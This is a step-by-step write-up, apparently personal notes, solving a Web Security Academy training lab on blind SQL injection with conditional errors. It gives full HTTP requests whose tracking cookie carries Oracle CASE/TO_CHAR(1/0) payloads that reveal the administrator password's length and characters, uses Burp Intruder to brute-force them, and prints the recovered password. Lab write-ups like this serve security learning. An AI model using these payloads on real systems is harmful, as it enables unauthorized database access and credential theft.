# Blind SQL injection with conditional errors

1. Send the following and observe that there is no error

```
GET /filter?category=Gifts HTTP/2
Host: 0a7f003803f71d8a80101766009c00fe.web-security-academy.net
Cookie: TrackingId=UVoRW6I9mNJr7RFY'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'; session=2mJkDTckwegP7KVDicy29FR0sM6YjjLK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a7f003803f71d8a80101766009c00fe.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


```

2. Now change 1=2 to 1=1 and see the error

![[attachments/sqli-lab-12/file-20260204130102874.png]]

3. Send the following request to determine the length of the administrator password

```
GET /filter?category=Gifts HTTP/2
Host: 0a7f003803f71d8a80101766009c00fe.web-security-academy.net
Cookie: TrackingId=UVoRW6I9mNJr7RFY'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=2mJkDTckwegP7KVDicy29FR0sM6YjjLK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://0a7f003803f71d8a80101766009c00fe.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


```

4. Note that the password is 20 characters in length

![[attachments/sqli-lab-12/file-20260204130505426.png]]

5. Submit the following sql injection in the tracking cookie to find the first character of the admin password

```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='7' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

![[attachments/sqli-lab-12/file-20260204130945374.png]]

6. Modify the request in intruder (use cluster bomb mode)

![[attachments/sqli-lab-12/file-20260204131115911.png]]

7. See the results and get the admin password

![[attachments/sqli-lab-12/file-20260204131346733.png]]

8. Log in as the admin to solve the lab

```
7txplp3qa6e3k1m2x0xe
```

